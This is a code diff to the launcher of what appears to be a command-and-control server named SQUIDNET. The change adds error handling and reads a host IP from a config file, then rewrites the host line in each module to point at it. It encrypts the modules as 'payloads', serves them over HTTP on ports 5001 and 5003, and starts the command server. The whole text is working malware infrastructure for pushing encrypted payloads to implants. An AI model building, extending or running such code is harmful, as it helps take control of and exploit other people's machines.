@@ -362,37 +362,61 @@ if __name__ == "__main__":
     helpers.show(figlet_format('SQUIDNET', font='slant'),colour='BLUE', style='BRIGHT',end='')
 
     #Initialize C2 Server
-    globals()['CommandServer'] = server()
-
-    helpers.show("ENCRYPTING MODULE PAYLOADS", colour='BLUE', style='BRIGHT', end='\n')
-    modules_dir = os.path.join(os.getcwd(), 'modules')
-    encrypted_dir = os.path.join(os.getcwd(), 'encrypted')
-    
-    for filename in os.listdir(modules_dir):
-        if filename.endswith(".py"):
-            
-            with open(os.path.join(modules_dir, filename), "rb") as f:
-                plaintext = f.read()
-                ciphertext = encryption.encrypt(plaintext, globals()['CommandServer'].key)
-                output_filepath = os.path.join(encrypted_dir, filename)
-                with open(output_filepath, "wb") as f_out:
-                        f_out.write(ciphertext)
+    try:
+        globals()['CommandServer'] = server()
 
 
+        config = read_config("config.json")
+        modules_dir = os.path.join(os.getcwd(), 'modules')
+        new_ip = config.get("host_ip")
+        #updating module code
+        print(new_ip)
+        print("update modules code")
+        for filename in os.listdir(modules_dir):
+            if filename.endswith(".py"):
+                filepath = os.path.join(modules_dir, filename)
+                helpers.replace_host_line(filepath, new_ip)
 
-    #host the module files
-    helpers.show("STARTING MODULE HOSTING", colour='BLUE', style='BRIGHT', end='\n')
-    globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
-    globals()['close'] = False
 
-    globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/usr/local/lib/python3.12/site-packages',shell=True)
+        helpers.show("ENCRYPTING MODULE PAYLOADS", colour='BLUE', style='BRIGHT', end='\n')
+        encrypted_dir = os.path.join(os.getcwd(), 'encrypted')
 
-    helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
-    globals()['CommandServer'].run()
+        
+        
+        for filename in os.listdir(modules_dir):
+            if filename.endswith(".py"):
+                
+                with open(os.path.join(modules_dir, filename), "rb") as f:
+                    plaintext = f.read()
+                    ciphertext = encryption.encrypt(plaintext, globals()['CommandServer'].key)
+                    output_filepath = os.path.join(encrypted_dir, filename)
+                    with open(output_filepath, "wb") as f_out:
+                            f_out.write(ciphertext)
 
 
-    #close the module host    
-    process = psutil.Process(globals()['module_host'].pid)
-    for proc in process.children(recursive=True):
-        proc.kill()
-    process.kill()
+
+        #host the module files
+        helpers.show("STARTING MODULE HOSTING", colour='BLUE', style='BRIGHT', end='\n')
+        globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
+        globals()['close'] = False
+
+        globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/usr/local/lib/python3.12/site-packages',shell=True)
+
+        helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
+        globals()['CommandServer'].run()
+
+    except KeyboardInterrupt:
+        # Graceful shutdown on Ctrl + C
+        helpers.show("\nKeyboard interrupt detected, shutting down...", "RED")
+        globals()['CommandServer']._quit()  # sets close = True so threads can exit
+        # Join threads if needed:
+        for t in globals()['CommandServer'].threads:
+            t.join()
+
+    finally:
+
+        #close the module host    
+        process = psutil.Process(globals()['module_host'].pid)
+        for proc in process.children(recursive=True):
+            proc.kill()
+        process.kill()
